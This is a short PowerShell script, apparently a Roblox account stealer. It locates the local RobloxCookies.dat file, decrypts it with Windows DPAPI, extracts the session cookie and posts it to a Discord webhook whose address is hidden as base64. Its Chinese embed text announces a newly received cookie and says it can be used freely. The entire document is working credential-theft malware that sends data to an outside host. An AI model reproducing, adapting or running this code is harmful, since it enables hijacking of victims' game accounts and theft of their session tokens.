$OutputEncoding = [System.Text.Encoding]::UTF8

# 1. Retrieve Roblox Token (Decryption logic remains unchanged)
$p="$env:LocalAppData\Roblox\LocalStorage\RobloxCookies.dat"; 
if(Test-Path $p){ 
    [void][Reflection.Assembly]::LoadWithPartialName('System.Security'); 
    $j=(Get-Content $p -Raw|ConvertFrom-Json).CookiesData; 
    $d=[Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($j),$null,'CurrentUser'); 
    $s=[Text.Encoding]::UTF8.GetString($d); 
    if($s -match '(_\|WARNING.*?)(;|$)'){
        $cookie=$matches[1]
    } 
} else {
    $cookie = "Roblox Not Found"
}

# 2. Base64 Encoded Strings (Webhook URL and Embed Data)
$encodedUri = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMTUyMzI1NDQwNDE5MDIwOS9xbmZUYllnZk51T0NPQmJFcXd1TUhIallDbHRxZ004aVFrcEN5ME5GVmFTMTRvUm1LcWZ5c0lRdGthdXc0WUZnR2V6"
$encodedTitle = "5paw55qEcm9ibG94IGNvb2tpZeaOpeWUtg==" # "新的roblox cookie接收"
$encodedFooter = "5Y+v5Lul55uh5oOF5L2/55So" # "可以盡情使用"

# 3. Decode helper function
function Decode-B64($val) {
    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($val))
}

# 4. Prepare Payload with Decoded strings
$uri = Decode-B64 $encodedUri
$payload = @{
    embeds = @(
        @{
            title = Decode-B64 $encodedTitle
            color = 3447003 
            
            fields = @(
                @{
                    name = "cookie"
                    value = "```$cookie```"
                }
            )

            footer = @{
                text = Decode-B64 $encodedFooter
            }
        }
    )
}

# 5. Convert to JSON and ensure UTF-8 encoding
$jsonPayload = $payload | ConvertTo-Json -Depth 10
$utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($jsonPayload)

# 6. Execute POST request
Invoke-RestMethod -Uri $uri -Method Post -Body $utf8Bytes -ContentType "application/json; charset=utf-8"
